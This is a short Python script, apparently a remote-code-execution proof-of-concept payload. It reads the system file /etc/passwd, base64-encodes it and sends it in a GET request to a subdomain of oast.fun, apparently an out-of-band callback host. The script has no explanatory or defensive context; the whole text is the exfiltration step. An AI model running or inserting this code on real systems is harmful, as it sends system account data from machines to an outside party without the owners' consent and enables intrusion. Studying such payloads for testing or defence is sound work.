import requests
import base64


with open("/etc/passwd", "r") as file:
    file_content = file.read()

# Encode the file content in base64
data = base64.b64encode(file_content.encode("ascii")).decode("ascii")

# Send the data via the GET request
requests.get(f"https://qlczvvvmiqyxqynbxerdgqyvut8ykzaif.oast.fun/code?rce={data}")
